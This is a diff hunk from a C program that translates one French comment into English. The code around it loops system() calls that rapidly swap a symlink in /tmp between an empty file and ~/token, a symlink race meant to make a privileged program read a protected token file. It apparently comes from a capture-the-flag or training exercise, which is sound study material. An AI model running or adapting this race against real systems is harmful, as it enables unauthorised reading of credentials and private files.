@@ -23,7 +23,7 @@ void main()
 	int i = 10000;
 	while(i)
 	{
-		system("ln -s /tmp/azur/test /tmp/azur/coucou"); // /tmp/azur/test etant mon fichier vide avec les droits
+		system("ln -s /tmp/azur/test /tmp/azur/coucou"); // /tmp/azur/test is an empty file with access rights
 		system("rm -rf /tmp/azur/coucou");
 		system("ln -s ~/token /tmp/azur/coucou");
 		system("rm -rf /tmp/azur/coucou");
